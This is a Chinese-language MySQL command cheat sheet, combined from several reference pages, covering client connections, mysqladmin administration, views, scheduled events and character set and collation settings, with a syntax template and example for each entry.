# 登录后直接使用指定数据库
mysql -u root -p mydb
```

**单行写法：通过 socket 连接**
`mysql -u <用户名> -p --socket=<socket路径>`
```bash
# 指定 socket 文件连接
mysql -u root -p --socket=/tmp/mysql.sock
```

**单行写法：使用配置文件连接**
`mysql --defaults-file=<配置文件>`
```bash
# 使用配置文件中的连接信息
mysql --defaults-file=/etc/mysql/my.cnf
```

---

## 客户端命令

**单行写法：查看帮助**
`mysql --help`
```bash
# 查看 mysql 客户端帮助
mysql --help
```

**单行写法：查看版本**
`mysql --version`
```bash
# 查看 MySQL 客户端版本
mysql --version
```

**单行写法：执行 SQL 后退出**
`mysql -u <用户> -p -e "<SQL语句>"`
```bash
# 执行单条 SQL 并返回
mysql -u root -p -e "SELECT VERSION();"
```

**单行写法：执行 SQL 文件**
`mysql -u <用户> -p <数据库> < <SQL文件>`
```bash
# 执行脚本文件
mysql -u root -p mydb < /path/to/script.sql
```

**单行写法：垂直显示结果**
`mysql -u <用户> -p -e "<SQL>" --vertical`
```bash
# 以垂直方式显示宽结果
mysql -u root -p -e "SELECT * FROM users" --vertical
```

**单行写法：表格输出**
`mysql -u <用户> -p -e "<SQL>" --table`
```bash
# 表格形式输出结果
mysql -u root -p -e "SELECT id, name FROM users" --table
```

**单行写法：批处理静默模式**
`mysql -u <用户> -p -s -N -e "<SQL>"`
```bash
# 静默模式去除表格边框和列名
mysql -u root -p -s -N -e "SELECT username FROM users"
```

---

## 交互式命令

**单行写法：查看所有数据库**
`SHOW DATABASES;`
```sql
-- 列出所有数据库
SHOW DATABASES;
```

**单行写法：选择数据库**
`USE <数据库名>;`
```sql
-- 切换数据库
USE mydb;
```

**单行写法：查看所有表**
`SHOW TABLES;`
```sql
-- 列出当前库所有表
SHOW TABLES;
```

**单行写法：查看表结构**
`DESC <表名>;`
```sql
-- 查看表字段
DESC users;
```

**单行写法：查看状态**
`STATUS;`
```sql
-- 查看服务器状态
STATUS;
```

**单行写法：清除当前输入**
`\c`
```sql
-- 取消当前未完成的 SQL 输入
SELECT * FROM users\c
```

**单行写法：退出客户端**
`exit;` 或 `quit;`
```sql
-- 退出 mysql 客户端
exit;
```

**单行写法：切换数据库快捷命令**
`\u <数据库名>`
```sql
-- 快速切换数据库
\u mydb
```

**单行写法：执行系统命令**
`\! <系统命令>`
```sql
-- 在 mysql 客户端中执行系统命令
\! ls -la
```

**单行写法：执行 SQL 文件**
`source <文件路径>;` 或 `\. <文件路径>`
```sql
-- 在客户端中执行 SQL 文件
source /path/to/script.sql;
```

---

## 备份恢复

**单行写法：导出数据库**
`mysqldump -u <用户> -p <数据库> > <文件>`
```bash
# 导出整个数据库
mysqldump -u root -p mydb > mydb_backup.sql
```

**单行写法：导出单张表**
`mysqldump -u <用户> -p <数据库> <表名> > <文件>`
```bash
# 仅导出 users 表
mysqldump -u root -p mydb users > users_backup.sql
```

**单行写法：导出多张表**
`mysqldump -u <用户> -p <数据库> <表1> <表2> > <文件>`
```bash
# 导出多个表
mysqldump -u root -p mydb users orders > backup.sql
```

**单行写法：导出所有数据库**
`mysqldump -u <用户> -p --all-databases > <文件>`
```bash
# 导出全部数据库
mysqldump -u root -p --all-databases > all_backup.sql
```

**单行写法：仅导出表结构**
`mysqldump -u <用户> -p --no-data <数据库> > <文件>`
```bash
# 仅导出表结构不导出数据
mysqldump -u root -p --no-data mydb > schema.sql
```

**单行写法：仅导出数据**
`mysqldump -u <用户> -p --no-create-info <数据库> > <文件>`
```bash
# 仅导出数据不导出表结构
mysqldump -u root -p --no-create-info mydb > data.sql
```

**单行写法：导入数据**
`mysql -u <用户> -p <数据库> < <文件>`
```bash
# 从备份文件恢复数据
mysql -u root -p mydb < mydb_backup.sql
```

---

## 服务管理

**单行写法：查看 MySQL 服务状态**
`systemctl status mysql`
```bash
# 查看 MySQL 服务状态
systemctl status mysql
```

**单行写法：启动 MySQL 服务**
`systemctl start mysql`
```bash
# 启动 MySQL 服务
systemctl start mysql
```

**单行写法：停止 MySQL 服务**
`systemctl stop mysql`
```bash
# 停止 MySQL 服务
systemctl stop mysql
```

**单行写法：重启 MySQL 服务**
`systemctl restart mysql`
```bash
# 重启 MySQL 服务
systemctl restart mysql
```

**单行写法：查看 MySQL 进程**
`mysqladmin -u <用户> -p processlist`
```bash
# 查看当前 MySQL 进程列表
mysqladmin -u root -p processlist
```

**单行写法：查看服务器状态**
`mysqladmin -u <用户> -p status`
```bash
# 查看 MySQL 服务器状态
mysqladmin -u root -p status
```

---

## 配置与变量

**单行写法：查看系统变量**
`SHOW VARIABLES LIKE '<模式>';`
```sql
-- 查看字符集相关变量
SHOW VARIABLES LIKE 'character%';
```

**单行写法：查看全局变量**
`SELECT @@global.<变量名>;`
```sql
-- 查看全局最大连接数
SELECT @@global.max_connections;
```

**单行写法：设置全局变量**
`SET GLOBAL <变量名> = <值>;`
```sql
-- 设置最大连接数
SET GLOBAL max_connections = 500;
```

**单行写法：查看会话变量**
`SELECT @@session.<变量名>;`
```sql
-- 查看当前会话时区
SELECT @@session.time_zone;
```

**单行写法：设置会话变量**
`SET SESSION <变量名> = <值>;`
```sql
-- 设置会话时区
SET SESSION time_zone = '+08:00';
```

**单行写法：查看状态信息**
`SHOW STATUS LIKE '<模式>';`
```sql
-- 查看连接数
SHOW STATUS LIKE 'Threads%';
```

---

## 工具命令

**单行写法：检查表**
`mysqlcheck -u <用户> -p --check <数据库>`
```bash
# 检查数据库所有表
mysqlcheck -u root -p --check mydb
```

**单行写法：修复表**
`mysqlcheck -u <用户> -p --repair <数据库>`
```bash
# 修复数据库表
mysqlcheck -u root -p --repair mydb
```

**单行写法：优化表**
`mysqlcheck -u <用户> -p --optimize <数据库>`
```bash
# 优化数据库表
mysqlcheck -u root -p --optimize mydb
```

**单行写法：分析表**
`mysqlcheck -u <用户> -p --analyze <数据库>`
```bash
# 分析表更新统计信息
mysqlcheck -u root -p --analyze mydb
```

**单行写法：查看慢查询日志**
`mysqldumpslow -s t -t <数量> <日志文件>`
```bash
# 按耗时排序查看前 10 条慢查询
mysqldumpslow -s t -t 10 /var/log/mysql/slow.log
```

<!-- ============ 文档分隔线：020-mysql/088-Mysqladmin.md ============ -->

## 服务状态检查

**基本写法：检查服务器存活**
`mysqladmin -u <用户名> -p ping`

```bash
# 检测 MySQL 服务是否运行（返回 mysqld is alive）
mysqladmin -u root -p ping
```

**基本写法：查看服务器状态**
`mysqladmin -u <用户名> -p status`

```bash
# 查看连接数、运行时间等概览
mysqladmin -u root -p status
# 输出: Uptime: 3600  Threads: 5  Questions: 1234  Slow queries: 0  Opens: 100
```

**基本写法：查看扩展状态**
`mysqladmin -u <用户名> -p extended-status`

```bash
# 查看所有状态变量
mysqladmin -u root -p extended-status
# 查看特定状态变量
mysqladmin -u root -p extended-status | grep -i thread
```

**基本写法：查看版本信息**
`mysqladmin -u <用户名> -p version`

```bash
# 查看 MySQL 版本与协议信息
mysqladmin -u root -p version
```

---

## 进程与连接管理

**基本写法：查看进程列表**
`mysqladmin -u <用户名> -p processlist`

```bash
# 查看当前所有连接与执行的 SQL
mysqladmin -u root -p processlist
```

**基本写法：杀掉指定连接**
`mysqladmin -u <用户名> -p kill <连接ID> [<连接ID2> ...]`

```bash
# 终止指定会话（ID 来自 processlist）
mysqladmin -u root -p kill 1234 5678
```

**基本写法：杀掉某用户所有连接**
`mysqladmin -u <用户名> -p kill $(mysqladmin -u root -p processlist | grep <用户名> | awk '{print $2}')`

```bash
# 终止某用户的所有连接
mysqladmin -u root -p kill $(mysqladmin -u root -ppass processlist | grep appuser | awk '{print $2}')
```

---

## 服务控制

**基本写法：关闭服务器**
`mysqladmin -u <用户名> -p shutdown`

```bash
# 安全关闭 MySQL 服务
mysqladmin -u root -p shutdown
```

**基本写法：刷新权限**
`mysqladmin -u <用户名> -p flush-privileges`

```bash
# 重新加载授权表（8.4 需 FLUSH_PRIVILEGES 权限）
mysqladmin -u root -p flush-privileges
```

**基本写法：刷新日志**
`mysqladmin -u <用户名> -p flush-logs`

```bash
# 关闭并重新打开日志文件（轮转二进制日志）
mysqladmin -u root -p flush-logs
```

**基本写法：刷新主机缓存**
`mysqladmin -u <用户名> -p flush-hosts`

```bash
# 清空主机缓存（8.4 FLUSH HOSTS 已移除，等价于 TRUNCATE host_cache）
mysqladmin -u root -p flush-hosts
```

**基本写法：刷新表**
`mysqladmin -u <用户名> -p flush-tables`

```bash
# 关闭所有打开的表并刷新缓存
mysqladmin -u root -p flush-tables
```

**基本写法：刷新状态变量**
`mysqladmin -u <用户名> -p flush-status`

```bash
# 重置大多数状态变量为 0
mysqladmin -u root -p flush-status
```

---

## 密码与变量

**基本写法：修改用户密码**
`mysqladmin -u <用户名> -p password "<新密码>"`

```bash
# 修改当前用户密码
mysqladmin -u root -p password "NewStrongPass123!"
```

**基本写法：查看/设置变量**
`mysqladmin -u <用户名> -p variables`

```bash
# 查看所有系统变量
mysqladmin -u root -p variables
# 过滤查看字符集相关变量
mysqladmin -u root -p variables | grep -i character
```

**基本写法：动态设置变量**
`mysqladmin -u <用户名> -p variable-set "<变量名>=<值>"`

```bash
# 在线调整最大连接数
mysqladmin -u root -p variable-set max_connections=500
```

---

## 其他常用

**基本写法：重新加载授权表并刷新**
`mysqladmin -u <用户名> -p reload`

```bash
# 重新加载授权表（等同 flush-privileges）
mysqladmin -u root -p reload
```

**基本写法：刷新线程缓存**
`mysqladmin -u <用户名> -p flush-threads`

```bash
# 清空线程缓存
mysqladmin -u root -p flush-threads
```

**基本写法：刷新查询缓存（8.0 前可用）**
`mysqladmin -u <用户名> -p refresh`

```bash
# 刷新表并刷新日志
mysqladmin -u root -p refresh
```

<!-- ============ 文档分隔线：020-mysql/089-View.md ============ -->

## 创建视图

**基本写法：创建视图**
`CREATE VIEW <视图名> AS <SELECT 语句>;`

```sql
-- 创建用户概览视图
CREATE VIEW v_user_summary AS
SELECT
  user_id,
  user_name,
  email,
  created_at
FROM users
WHERE status = 'active';
```

**基本写法：创建或替换视图**
`CREATE OR REPLACE VIEW <视图名> AS <SELECT 语句>;`

```sql
-- 已存在则替换，避免 DROP 再建
CREATE OR REPLACE VIEW v_user_summary AS
SELECT user_id, user_name, email, last_login
FROM users;
```

**基本写法：指定列名创建视图**
`CREATE VIEW <视图名> (<列1>, <列2>, ...) AS <SELECT 语句>;`

```sql
-- 显式指定视图列名
CREATE VIEW v_orders (订单号, 客户, 金额) AS
SELECT order_id, customer_name, amount FROM orders;
```

**基本写法：带检查选项创建视图**
`CREATE VIEW <视图名> AS <SELECT 语句> [WITH CHECK OPTION];`

```sql
-- 通过视图插入的数据必须满足视图 WHERE 条件
CREATE VIEW v_active_users AS
SELECT * FROM users WHERE status = 'active'
WITH CHECK OPTION;
```

**基本写法：级联/本地检查选项**
`CREATE VIEW <视图名> AS <SELECT> WITH [CASCADED|LOCAL] CHECK OPTION;`

```sql
-- CASCADED 检查所有依赖视图（默认），LOCAL 仅检查当前视图
CREATE VIEW v_vip AS
SELECT * FROM v_active_users WHERE vip_level > 3
WITH CASCADED CHECK OPTION;
```

---

## 查询视图

**基本写法：查询视图**
`SELECT <列> FROM <视图名> [WHERE <条件>];`

```sql
-- 像普通表一样查询视图
SELECT user_name, email FROM v_user_summary WHERE user_id = 100;
```

**基本写法：查看视图定义**
`SHOW CREATE VIEW <视图名>;`

```sql
-- 查看视图创建语句
SHOW CREATE VIEW v_user_summary\G
```

**基本写法：查看视图元数据**
`SELECT * FROM information_schema.VIEWS WHERE table_name = '<视图名>';`

```sql
-- 查询视图定义与检查选项
SELECT table_schema, table_name, view_definition, check_option
FROM information_schema.VIEWS
WHERE table_name = 'v_user_summary';
```

---

## 修改视图

**基本写法：ALTER 修改视图**
`ALTER VIEW <视图名> AS <SELECT 语句>;`

```sql
-- 修改视图定义
ALTER VIEW v_user_summary AS
SELECT user_id, user_name, phone, last_login
FROM users
WHERE status = 'active';
```

**基本写法：修改视图 SQL 安全上下文**
`ALTER VIEW <视图名> SQL SECURITY {DEFINER|INVOKER} AS <SELECT 语句>;`

```sql
-- 以调用者权限执行（8.4 需 SET_ANY_DEFINER 权限指定他人 DEFINER）
ALTER VIEW v_user_summary
SQL SECURITY INVOKER
AS SELECT user_id, user_name FROM users;
```

---

## 删除视图

**基本写法：删除视图**
`DROP VIEW [IF EXISTS] <视图名> [, <视图2> ...];`

```sql
-- 安全删除视图
DROP VIEW IF EXISTS v_user_summary, v_orders;
```

---

## 可更新视图

**基本写法：通过视图插入数据**
`INSERT INTO <视图名> (<列>) VALUES (<值>);`

```sql
-- 通过视图插入（视图需包含基表所有非空列）
INSERT INTO v_active_users (user_name, email, status)
VALUES ('张三', 'zhangsan@example.com', 'active');
```

**基本写法：通过视图更新数据**
`UPDATE <视图名> SET <列> = <值> WHERE <条件>;`

```sql
-- 通过视图更新基表数据
UPDATE v_user_summary SET email = 'new@example.com' WHERE user_id = 100;
```

**基本写法：通过视图删除数据**
`DELETE FROM <视图名> WHERE <条件>;`

```sql
-- 通过视图删除基表数据
DELETE FROM v_active_users WHERE user_id = 100;
```

<!-- ============ 文档分隔线：020-mysql/090-EventScheduler.md ============ -->

## 调度器开关

**基本写法：查看事件调度器状态**
`SHOW VARIABLES LIKE 'event_scheduler';`

```sql
-- 查看事件调度器是否开启
SHOW VARIABLES LIKE 'event_scheduler';
-- 输出: event_scheduler | ON / OFF
```

**基本写法：开启事件调度器**
`SET GLOBAL event_scheduler = ON;`

```sql
-- 全局开启事件调度器（运行时生效，重启失效）
SET GLOBAL event_scheduler = ON;
```

**基本写法：配置文件持久开启**
`event_scheduler = ON`

```ini
# my.cnf 中配置，重启后持久生效
[mysqld]
event_scheduler = ON
```

---

## 创建事件

**基本写法：一次性事件**
`CREATE EVENT <事件名> ON SCHEDULE AT <时间点> DO <SQL 语句>;`

```sql
-- 在指定时间执行一次
CREATE EVENT e_clean_logs
ON SCHEDULE AT '2024-12-31 23:59:59'
DO DELETE FROM logs WHERE created_at < NOW() - INTERVAL 30 DAY;
```

**基本写法：当前时间延迟执行**
`CREATE EVENT <事件名> ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL <数值> <单位> DO <SQL>;`

```sql
-- 1 小时后执行一次
CREATE EVENT e_notify
ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 1 HOUR
DO UPDATE users SET notified = 1 WHERE last_login < NOW() - INTERVAL 7 DAY;
```

**基本写法：周期事件**
`CREATE EVENT <事件名> ON SCHEDULE EVERY <数值> <单位> DO <SQL 语句>;`

```sql
-- 每天执行一次清理
CREATE EVENT e_daily_clean
ON SCHEDULE EVERY 1 DAY
STARTS CURRENT_TIMESTAMP
DO CALL sp_clean_expired();
```

**基本写法：指定起止时间的周期事件**
`CREATE EVENT <事件名> ON SCHEDULE EVERY <间隔> STARTS <开始> ENDS <结束> DO <SQL>;`

```sql
-- 每小时执行，限定起止时间
CREATE EVENT e_hourly_stat
ON SCHEDULE EVERY 1 HOUR
STARTS '2024-01-01 00:00:00'
ENDS '2024-12-31 23:59:59'
DO CALL sp_calc_hourly_stats();
```

**基本写法：复合语句事件**
`CREATE EVENT <事件名> ON SCHEDULE <调度> DO BEGIN <语句1>; <语句2>; END`

```sql
-- 执行多条语句需用 BEGIN...END 包裹并重置分隔符
DELIMITER //
CREATE EVENT e_multi ON SCHEDULE EVERY 1 DAY
DO BEGIN
  DELETE FROM logs WHERE created_at < NOW() - INTERVAL 30 DAY;
  UPDATE stats SET count = 0 WHERE stat_date = CURDATE();
END //
DELIMITER ;
```

---

## 事件管理

**基本写法：查看事件**
`SHOW EVENTS [FROM <数据库名>] [LIKE '<模式>'];`

```sql
-- 查看当前库所有事件
SHOW EVENTS;
-- 查看指定库事件
SHOW EVENTS FROM mydb LIKE 'e_%';
```

**基本写法：查看事件定义**
`SHOW CREATE EVENT <事件名>;`

```sql
-- 查看事件创建语句
SHOW CREATE EVENT e_daily_clean\G
```

**基本写法：查看事件元数据**
`SELECT * FROM information_schema.EVENTS WHERE event_name = '<事件名>';`

```sql
-- 查询事件状态与调度信息
SELECT event_name, last_executed, status, interval_value, interval_field
FROM information_schema.EVENTS
WHERE event_schema = 'mydb';
```

---

## 修改与删除

**基本写法：禁用/启用事件**
`ALTER EVENT <事件名> {DISABLE|ENABLE};`

```sql
-- 临时禁用事件
ALTER EVENT e_daily_clean DISABLE;
-- 重新启用
ALTER EVENT e_daily_clean ENABLE;
```

**基本写法：修改事件调度**
`ALTER EVENT <事件名> ON SCHEDULE <新调度> DO <SQL>;`

```sql
-- 修改执行周期为每周一次
ALTER EVENT e_daily_clean
ON SCHEDULE EVERY 1 WEEK STARTS CURRENT_TIMESTAMP
DO CALL sp_clean_expired();
```

**基本写法：重命名事件**
`ALTER EVENT <旧事件名> RENAME TO <新事件名>;`

```sql
-- 重命名事件
ALTER EVENT e_daily_clean RENAME TO e_weekly_clean;
```

**基本写法：删除事件**
`DROP EVENT [IF EXISTS] <事件名>;`

```sql
-- 安全删除事件
DROP EVENT IF EXISTS e_weekly_clean;
```

<!-- ============ 文档分隔线：020-mysql/091-CharsetCollation.md ============ -->

## 查看字符集

**基本写法：查看可用字符集**
`SHOW CHARACTER SET [LIKE '<模式>'];`

```sql
-- 查看所有字符集
SHOW CHARACTER SET;
-- 过滤查看 utf8mb4 相关
SHOW CHARACTER SET LIKE 'utf8%';
```

**基本写法：查看可用排序规则**
`SHOW COLLATION [LIKE '<模式>'];`

```sql
-- 查看 utf8mb4 的所有排序规则
SHOW COLLATION LIKE 'utf8mb4%';
```

**基本写法：查看当前字符集变量**
`SHOW VARIABLES LIKE 'character_set%';`

```sql
-- 查看连接、服务、数据库等字符集设置
SHOW VARIABLES LIKE 'character_set%';
```

**基本写法：查看排序规则变量**
`SHOW VARIABLES LIKE 'collation%';`

```sql
-- 查看连接与服务排序规则
SHOW VARIABLES LIKE 'collation%';
```

---

## 数据库级设置

**基本写法：建库时指定字符集**
`CREATE DATABASE <库名> CHARACTER SET <字符集> COLLATE <排序规则>;`

```sql
-- 创建 utf8mb4 库（推荐，支持完整 emoji）
CREATE DATABASE mydb
CHARACTER SET utf8mb4
COLLATE utf8mb4_0900_ai_ci;
```

**基本写法：修改库字符集**
`ALTER DATABASE <库名> CHARACTER SET <字符集> COLLATE <排序规则>;`

```sql
-- 将库转为 utf8mb4
ALTER DATABASE mydb
CHARACTER SET utf8mb4
COLLATE utf8mb4_0900_ai_ci;
```

---

## 表级设置

**基本写法：建表时指定字符集**
`CREATE TABLE <表名> (...) CHARACTER SET <字符集> COLLATE <排序规则>;`

```sql
-- 建表指定字符集与排序规则
CREATE TABLE users (
  id BIGINT PRIMARY KEY,
  name VARCHAR(50)
) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;
```

**基本写法：修改表字符集**
`ALTER TABLE <表名> CONVERT TO CHARACTER SET <字符集> COLLATE <排序规则>;`

```sql
-- 转换表字符集（同时转换已有数据编码）
ALTER TABLE users
CONVERT TO CHARACTER SET utf8mb4
COLLATE utf8mb4_0900_ai_ci;
```

**基本写法：仅修改表默认字符集（不转换数据）**
`ALTER TABLE <表名> CHARACTER SET <字符集> COLLATE <排序规则>;`

```sql
-- 只改默认字符集，不影响已有列数据
ALTER TABLE users CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;
```

---

## 列级设置

**基本写法：列指定字符集**
`<列名> <字符类型>(<长度>) CHARACTER SET <字符集> COLLATE <排序规则>`

```sql
-- 指定列使用 utf8mb4 与区分大小写排序规则
CREATE TABLE articles (
  id BIGINT PRIMARY KEY,
  title VARCHAR(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_as_cs,
  content TEXT CHARACTER SET utf8mb4
);
```

**基本写法：修改列字符集**
`ALTER TABLE <表名> MODIFY <列名> <类型> CHARACTER SET <字符集> COLLATE <排序规则>;`

```sql
-- 修改列字符集
ALTER TABLE articles
MODIFY title VARCHAR(200)
CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;
```

---

## 连接级设置

**基本写法：设置连接字符集**
`SET NAMES <字符集> [COLLATE <排序规则>];`

```sql
-- 设置客户端、连接、结果字符集（最常用）
SET NAMES utf8mb4;
```

**基本写法：设置单个字符集变量**
`SET <变量名> = <字符集>;`

```sql
-- 分别设置各环节字符集
SET character_set_client = utf8mb4;
SET character_set_connection = utf8mb4;
SET character_set_results = utf8mb4;
```

---

## 排序规则后缀说明

**基本写法：排序规则后缀含义**
`<字符集>_<版本>_<强弱>_<重音>_<大小写>`

```sql
-- utf8mb4_0900_ai_ci 含义：
-- 0900: Unicode 9.0 标准
-- ai:    accent-insensitive 不区分重音
-- cs:    case-sensitive 区分大小写（_as 区分重音）
-- _bin:  二进制比较
-- 区分大小写排序规则示例
SELECT * FROM users ORDER BY name COLLATE utf8mb4_0900_as_cs;
```

**基本写法：查询时指定排序规则**
`ORDER BY <列> COLLATE <排序规则>`

```sql
-- 临时使用区分大小写的排序
SELECT * FROM users ORDER BY name COLLATE utf8mb4_0900_as_cs;
```

**基本写法：比较时强制排序规则**
`<表达式> COLLATE <排序规则> = <表达式>`

```sql
-- 跨排序规则比较时需统一
SELECT * FROM a JOIN b ON a.name COLLATE utf8mb4_0900_ai_ci = b.name;
```
